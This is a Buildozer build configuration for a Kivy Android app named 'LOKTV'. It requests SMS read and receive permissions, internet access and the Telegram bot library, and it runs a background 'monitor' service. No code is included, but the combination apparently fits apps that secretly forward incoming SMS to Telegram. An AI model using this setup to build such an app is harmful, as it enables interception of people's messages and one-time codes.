[app]
title = LOKTV
package.name = loktv
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.2
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET
android.api = 31
android.minapi = 21
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
services = monitor:main.py
[buildozer]
log_level = 2
